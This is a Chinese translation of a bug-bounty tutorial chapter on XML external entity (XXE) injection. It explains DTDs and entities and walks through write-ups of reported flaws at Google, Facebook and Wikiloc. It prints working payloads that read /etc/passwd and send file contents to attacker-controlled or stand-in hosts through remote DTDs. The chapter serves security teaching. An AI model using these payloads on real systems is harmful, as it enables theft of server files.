## **0x10-XML 外部實體注入**
>作者：Peter Yaworski
>
>譯者：飛龍
>
>協議：CC BY-NC-SA 4.0

XML 外部實體（XXE）漏洞涉及利用應用解析 XML 輸入的方式，更具體來說，應用程序處理輸入中外部實體的包含方式。為了完全理解理解如何利用，以及他的潛力。我覺得我們最好首先理解什麽是 XML 和外部實體。
`<p>`
元語言是用於描述其它語言的語言，這就是 XML。它在 HTML 之後開發，來彌補 HTML 的不足。HTML 用於定義資料的展示，專註於它應該是什麽樣子。房子，XML 用於定義資料如何被組織。
<p>

例如，HTML 中，你的標簽為`<title>`, `<h1>`, `<table>`, `<p>`，以及其它。這些東西都用於定義內容如何展示。`<title>`用於定義頁面的標題，`<h1>`標簽定義了標題，`<table>`標簽按行和列展示資料，並且`<p>`表示為簡單文本。反之，XML 沒有預定義的標簽。創建 XML 文檔的人可以定義它們自己的標簽，來描述展示的內容。這裡是一個示例。
<p>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<jobs>
    <job>
        <title>Hacker</title>
        <compensation>1000000</compensation>
        <responsibility optional="1">Shot the web</responsibility>
    </job>
</jobs>
```
讀完了之後，你可以大致猜測出 XML 文檔的目的 -- 為了展示職位列表，但是如果它在 Web 頁面上展示，你不知道它看起來是什麽樣。XML 的第一行是一個聲明頭部，表示 XML 的版本，以及編碼類型。在編寫此文的時候，XML 有兩個版本，1.0 和 1.1。它們的具體區別超出了本書範圍，因為它們在你滲透的時候沒什麽影響。
<p>

在初始的頭部之後，標簽`<jobs>`位於所有其它`<job>`標簽的外面。`<job>`又包含`<title>`、`<compensation>`和`<responsibilities>`標簽。現在如果是 HTML，一些標簽並不需要（但最好有）閉合標簽（例如`<br>`），但是所有 XML 標簽都需要閉合標簽。同樣，選取上面的例子，`<jobs>`是個起始標簽，`</jobs>`是對應的閉合標簽。此外，每個標簽都有名稱，並且可以擁有屬性。使用標簽`<job>`，標簽名稱就是job，但是沒有屬性。另一方面，`<responsibility>`擁有名稱`responsibility`，並擁有屬性`optional`，由屬性名稱`optional`和值`1`組成。
<p>

由於任何人可以定義任何標簽，問題就來了，如果標簽可以是任何東西，任何一個人如何知道如何解析和使用 XML 文檔？好吧，一個有效的 XML 文檔之所以有效，是因為它遵循了 XML 的通用規則（我不需要列出它們，但是擁有閉合標簽是一個前面提過的例子），並且它匹配了它的文檔類型定義（DTD）。DTD 是我們繼續深入的全部原因，因為它是允許我們作為黑客利用它的一個東西。
<p>

XML DTD 就像是所使用的標簽的定義文檔，並且由 XML 設計者或作者開發。使用上面的例子，我就是設計者，因為我在 XML 中定義了職位文檔。DTD 定義了存在什麽標簽，它們擁有什麽屬性，以及其它元素裏面有什麽元素，以及其他。當你或者我創建自己的 DTD 時，一些已經格式化了，並且廣泛用於 RSS、RDF、HL7 SGML/XML。以及其它。
<p>

下面是 DTD 文件的樣子，它用於我的 XML。

```xml
<!ELEMENT Jobs (Job)*>
<!ELEMENT Job (Title, Compensation, Responsiblity)>
<!ELEMENT Title (#PCDATA)>
<!ELEMENT Compenstaion (#PCDATA)>
<!ELEMENT Responsibility(#PCDATA)>
<!ATTLIST Responsibility optional CDATA "0">
```

看一看這個，你可能猜到了它大部分是啥意思。我們的`jobs`標簽實際上是 XML `!ELEMENT`，並且可以包含job元素。`job`是個`!ELEMENT`，可以包含標題、薪資和職責，這些也都是`!ELEMENT`，並且只能包含字符資料（`#PCDATA`）。最後，`!ELEMENT responsibility`擁有一個可選屬性（`!ATTLIST`），默認值為 0。

並不是很難吧？除了 DTD，還有兩種還未討論的重要標簽，`!DOCTYPE`和`!ENTITY`。到現在為止，我只說了 DTD 文件是我們 XML 的擴展。要記住上面的第一個例子，XML 文檔並不包含標簽定義，它由我們第二個例子的 DTD 來完成。但是，我們可以將 DTD 包含在 XML 文檔內，並且這樣做之後， XML 的第一行必須是`<!DOCTYPE>`元素。將我們的兩個例子組合起來，我們就會得到這樣的文檔：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Jobs [
<!ELEMENT Job (Title, Compensation, Responsiblity)>
<!ELEMENT Title (#PCDATA)> <!ELEMENT Compenstaion (#PCDATA)>
<!ELEMENT Responsibility(#PCDATA)>
<!ATTLIST Responsibility optional CDATA "0">
]>
<jobs>
    <job>
        <title>Hacker</title>
        <compensation>1000000</compensation>
        <responsibility optional="1">Shot the web</responsibility>
    </job>
</jobs>
```

這裡，我們擁有了內部 DTD 聲明。要注意我們仍然使用一個聲明頭部開始，表示我們的文檔遵循 XML 1.0 和 UTF8 編碼。但是之後，我們為 XML 定義了要遵循的`DOCTYPE`。使用外部 DTD 是類似的，除了`!DOCTYPE是<!DOCTYPE note SYSTEM "jobs.dtd">`。XML 解析器在解析 XML 文件時，之後會解析`jobs.dtd`的內容。這非常重要，因為`!ENTITY`標簽被近似處理，並且是我們利用的關鍵。

XML 實體像是一個訊息的占位符。再次使用我們之前的例子。，如果我們想讓每個職位都包含到我們網站的連結，每次都編寫地址簡直太麻煩了，尤其是 URL 可能改變的時候。反之，我們可以使用`!ENTITY`，並且讓解析器在解析時獲取內容，並插入到文檔中。你可以看看我們在哪裏這樣做。

與外部 DTD 文檔類似，我們可以更新我們的 XML 文檔來包含這個想法：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Jobs [
<!ELEMENT Job (Title, Compensation, Responsiblity, Website)>
<!ELEMENT Title (#PCDATA)> <!ELEMENT Compenstaion (#PCDATA)>
<!ELEMENT Responsibility(#PCDATA)>
<!ATTLIST Responsibility optional CDATA "0">
<!ELEMENT Website ANY>
<!ENTITY url SYSTEM "website.txt">
]>

<jobs>
    <job>
        <title>Hacker</title>
        <compensation>1000000</compensation>
        <responsibility optional="1">Shot the web</responsibility>
        <website>&url;</website>
    </job>
</jobs>
```


這裡你會注意到，我繼續並添加了`Website`的`!ELEMENT`，但是不是`#PCDATA`，而是`ANY`。這意味著`Website`可以包含任何可解析的資料組合。我也定義了一個`!ENTITY`，帶有`SYSTEM`屬性，告訴解析器獲取`wensite.txt`文件的資料。現在一切都清楚了。
<p>

將它們放到一起，如果我包含了`/etc/passwd`，而不是`website.txt`，你覺得會發生什麽？你可能戶菜刀，我們的 XML 會被解析，並且服務器敏感文件`/etc/passwd`的內容會包含進我們的內容。但是我們是 XML 的作者，所以為什麽要這麽做呢？
<p>

好吧。當受害者的應用可以濫用，在 XML 的解析中包含這種外部實體時，XXE 攻擊就發生了。換句話說，應用有一些 XML 預期，但是在接收時卻不驗證它。所以，只是解析他所得到的東西。例如，假設我正在運行一個職位公告板，並允許你註冊並通過 XML 上傳職位。開發我的應用時，我可能使我的 DTD 文件可以被你訪問，並且假設你提交了符合需求的文件。我沒有意識到它的危險，決定天真地解析收到的內容，並沒有任何驗證。但是作為一個黑客，你決定提交：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>
```

就像你現在了解的那樣，當這個文件被解析時，我的解析器會收到它，並且看到內部 DTD 定義了`foo`文檔類型，告訴它`foo`可以包含任何可解析的資料，並且有個`!ENTITY xxe`，它應該讀取我的`/etc/passwd`文件（`file://`的用法表示/etc/passwd的完整的文件 URL 路徑），並會將&xxe;替換為這個文件的內容。之後你以定義<foo>標簽的有效 XML 結束了它，這會打印出我的服務器資料。這就是 XXE 危險的原因。
<p>

但是等一下，還有更多的東西。如果應用不打印出回應，而是僅僅解析你的內容會怎麽樣？使用上面的例子，內容會解析但是永遠不會反回給我們。好吧，如果我們不包含本地文件，而是打算和惡意服務器通信會怎麽樣？像是這樣：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
<!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
]>
<foo>&callhome;</foo>
```

在解釋它之前，你可能已經注意到我在`callhome` URL 中使用了`%`來代替`&`，`%xxe`。這是因為`%`用於實體在 DTD 定義內部被求值的情況，而`&`用於實體在 XML 文檔中被求值的情況。現在，當 XML 文檔被解析，`callhome !ENTITY`會讀取`/etc/passwd`的內容，並遠端呼叫`http://www.malicous.com`，將文件內容作為 URL 參數來發送，因為我們控制了該服務器，我們可以檢查我們的日誌，並且足夠確保擁有了`/etc/passwd`的內容。Web 應用的遊戲就結束了。

所以，站點如何防範 XXE 漏洞？它們可以禁止解析任何外部實體。

>連結
>
>查看 [OWASP 外部實體（XXE）解析](https://www.owasp.org/index.php/XML_External_Entity_(XXE)  Processing)
>
>[XXE 速查表](http://www.silentrobots.com/blog/2014/09/02/xe-cheatsheet)

---

## **示例**
## **1. Google 的讀取訪問**
```
難度：中

URL：google.com/gadgets/directory?synd=toolbar

報告鏈接：https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers

報告日期：2014.4

獎金：$10000
```
描述：

了解 XML 以及外部實體之後，這個漏洞實際上就非常直接了。Google 的工具欄按鈕允許開發者定義它們自己的按鈕，通過上傳包含特定元資料的 XML 文件。
<p>

但是，根據 Detectify 小組，通過上傳帶有`!ENTITY`，指向外部文件的 XML 文件，Google 解析了該文件，並渲染了內容。因此，小組使用了 XXE 漏洞來渲染服務器的`/etc/passwd`文件。遊戲結束。

![1](https://raw.githubusercontent.com/dyeat/Document_read/master/Web_Hacking_101/image/14-1.jpg)

Google 內部文件的 Detectify 截圖

>重要結論
>
>大公司甚至都存在漏洞。雖然這個報告是兩年之前了，它仍然是一個大公司如何犯錯的極好的例子。
>所需的 XML 可以輕易上傳到站點，站點使用了 XML 解析器。但是，有時站點不會產生響應，所以你需要測試來自 OWASP 速查表的其它輸入。

---

## **2. Facebook 單詞 XXE**
```
難度：難

URL：facebook.com/careers

報告連結：http://www.attack-secure.com/blog/hacked-facebook-word-document

報告日期：2014.4

獎金：$6300
```

描述：

這個 XXE 有一些區別，並且比第一個例子更有挑戰，因為它涉及到遠端呼叫服務器，就像我們在描述中討論的那樣。
<p>

2013 年末，Facebook 修補了一個 XXE 漏洞，它可能會升級為遠端代碼執行漏洞，因為`/etc/passwd`文件的內容是可訪問的。獎金約為$30000。

<p>

因此，在 Mohamed 於 2014 年 4 月挑戰自己來滲透 Facebook 的時候，它不認為 XXE 可能存在，直到他發現它們的職位頁面允許用戶上傳`.docx`文件，它可以包含 XML。對於那些不知道的人，`.docx`文件只是個 XML 文件的壓縮包。所以，根據 Mohames，它創建了一個`.docx`文件，並使用 7zip 打開它來提取內容，並將下面的載荷插入了一個 XML 文件中。

```xml
<!DOCTYPE root [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://197.37.102.90/ext.dtd">
%dtd;
%send;
]]>
```


你會想到，在解析的時候，如果受害者開啟了外部實體，XML 解析器會呼叫遠端主機。要注意`!ENTITY`定義中和下面使用了`%`。這是因為這些占位符用在 DTD 自身中。在收到請求呼叫之後，遠端服務器會發送回 DTD 文件，像這樣：

```xml
<!ENTITY send SYSTEM 'http://197.37.102.90/?%26file;'>"
```

所以，回到文件中的載荷：

1. 解析器會將`%dtd;`替換為獲取遠端 DTD 文件的呼叫。
2. 解析器會將`%send;`替換為服務器的遠端呼叫，但是%`file;`會替換為`file:///etc/passwd`的內容。

所以，Mohamed 使用 Python 和`SimpleHTTPServer`開啟了一台本地服務器，並等待接收：

![1](https://raw.githubusercontent.com/dyeat/Document_read/master/Web_Hacking_101/image/14-2-1.jpg)

Facebook 遠端呼叫的攻擊截圖
<p>

在報告之後，Facebook 發送了回覆，拒絕了這個報告，並說它們不能重現它，並請求內容的視頻驗證。在交換一些訊息之後，Facebook 提到招聘人員可能打開了文件，它會發送任意請求。Facebook 自傲組做了一些深入的挖掘，並給予了獎金，發送了一個郵件，解釋了這個 XXE 的影響比 2013 年初的要小，但是仍然是一個有效的利用，這裡是這個訊息。

![2](https://raw.githubusercontent.com/dyeat/Document_read/master/Web_Hacking_101/image/14-2.jpg)

Facebook 官方回覆
>重要結論
>
>這裡有一些重要結論。XML 文件以不同形式和大小出現。要留意接受.`docx`、.`xlsx`、.`pptx`，以及其它的站點。向我之前提到過的那樣，
>有時候你不會直接從 XXE >收到響應，這個示例展示了如何建立服務器來接受請求，它展示了 XXE。
>
>此外，像我們的例子中那樣，有時報告一開始會被拒絕。擁有訊息和耐心和你報告的公司周旋非常重要。尊重他們的決策，同時也解釋為什麽這可能是個漏洞。


---

## **3. Wikiloc XXE**
```
難度：高

URL：wikiloc.com

報告連結：http://www.davidsopas.com/wikiloc-xxe-vulnerability

報告日期：2015.10
獎金：Swag
```
描述：

根據他們的站定，Wikiloc 是個用於發現和分享最佳戶外遠足、騎車以及許多其他運動記錄的地方。有趣的是，他們也讓用戶通過 XML 文件上傳他們自己的記錄，這就對例如 David Soaps 之類的騎手非常有吸引力了。
<p>

基於他們的 Write Up，David 註冊了 Wikiloc，並注意到了 XML 上傳點，決定測試它有沒有 XXE 漏洞。最開始，它從站點下載了文件來判斷 XML 結構，這裡是一個`.gpx`文件，並插入了`*<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://www.davidsopas.com/XXE" > ]>;`。
<p>

之後它呼叫了`.gpx`文件中 13 行的記錄名稱中的實體。

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://www.davidsopas.com/XXE" > ]>
<gpx
version="1.0"
creator="GPSBabel - http://www.gpsbabel.org"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns="http://www.topografix.com/GPX/1/0"
xsi:schemaLocation="http://www.topografix.com/GPX/1/1 http://www.topografix.com/GPX/1/1/gpx.xsd">
<time>2015-10-29T12:53:09Z</time>
<bounds minlat="40.734267000" minlon="-8.265529000" maxlat="40.881475000" maxlon="-8.037170000"/>
<trk>
<name>&xxe;</name>
<trkseg>
<trkpt lat="40.737758000" lon="-8.093361000">
<ele>178.000000</ele>
<time>2009-01-10T14:18:10Z</time>
(...)
```

這產生了發往服務器的 HTTP GET 請求，`GET 144.76.194.66 /XXE/ 10/29/15 1:02PM Java/1.7.0_51`。這有兩個原因值得注意，首先，通過使用一個概念呼叫的簡單證明，David 能夠確認服務器求解了它插入的 XML 並且進行了外部呼叫。其次，David 使用現存的 XML 文件，以便時它的內容滿足站點所預期的結構。雖然它沒有討論這個，呼叫它的服務器可能並不是必須的，如果它能夠服務`/etc/passwd`文件，並將內容渲染在`<name>`元素中。

在確認 Wikiloc 會生成外部 HTTP 請求後，唯一的疑問就是，是否它能夠讀取本地文件。所以，它修改了註入的 XML，來讓 Wikiloc 向他發送它們的`/etc/passwd`文件內容。

```xml
<!DOCTYPE roottag [
<!ENTITY % file SYSTEM "file:///etc/issue">
<!ENTITY % dtd SYSTEM "http://www.davidsopas.com/poc/xxe.dtd">
%dtd;]>
<gpx
version="1.0"
creator="GPSBabel - http://www.gpsbabel.org"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns="http://www.topografix.com/GPX/1/0"
xsi:schemaLocation="http://www.topografix.com/GPX/1/1 http://www.topografix.com/GPX/1/1/gpx.xsd">
<time>2015-10-29T12:53:09Z</time>
<bounds minlat="40.734267000" minlon="-8.265529000" maxlat="40.881475000" maxlon="-8.037170000"/>
<trk>
<name>&send;</name>
(...)
```

這看起來十分熟悉。這裡他使用了兩個實體，它們都在 DTD 中求值，所以它們使用%定義。`&send`;在`<name>`標簽中的的引用實際上由返回的`xxe.dtd`文件定義，他的服務器將其發送回 Wikiloc。這裡是這個文件：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'http://www.davidsopas.com/XXE?%file;'>">
%all;
```

要注意`%all`;實際上定義了`!ENTITY send`，我們剛剛在`<name>`標簽中注意到它。這裡是求值的過程：
1. Wikiloc 解析了 XML，並將`%dtd`;求值為 David 的服務器的外部呼叫。
2. David 的服務器向 Wikiloc 返回了`xxe.dtd`文件。
3. Wikiloc 解析了收到的 DTD文件，它觸發了`%all`;的呼叫。
4. 當`%all`;求值時，它定義了`&send;`，它包含`%file`實體的呼叫。
5. `%file`;在 URL 值中被替換為`/etc/passwd`文件的內容。
6. Wikiloc 解析了 XML 文件，發現了`&send`;實體，它求值為 David 服務器的遠端呼叫，帶有`/etc/passwd`的內容，作為 URL 中的參數。

用他自己的話來說，遊戲結束了。

>重要結論
>
>像之前提到的那樣，這是一個不錯的例子，展示了如何使用來自站點的 XML 模板，來組裝你自己的 XML 實體，便於讓目標合理地解析文件。
>這裡，Wikiloc期待`.gpx`文件，而 David 保留了該結構，在預期標簽中插入了他自己的 XML 實體，也就是`<name>`標簽。此外，觀察如何處理惡意 DTD 文件很有意思，並且可以用於隨後讓目標向你的 服務器發送 GET 請求，帶有文件內容作為 URL 參數

##總結

XXE 表示一類有巨大潛力的有趣的攻擊向量。有幾種方式來完成，就像我們之前看到的那樣，它能夠讓漏洞應用打印自己的`/etc/passwd`文件，以`/etc/passwd`文件來調用遠端服務器，以及請求遠端 DTD 文件，它讓解析器來使用`/etc/passwd`文件調用服務器。
<p>

作為一個黑客，要留意文件上傳，特別是那些接受一些 XML 類型的上傳，應該始終測試它們是否存在 XXE 漏洞。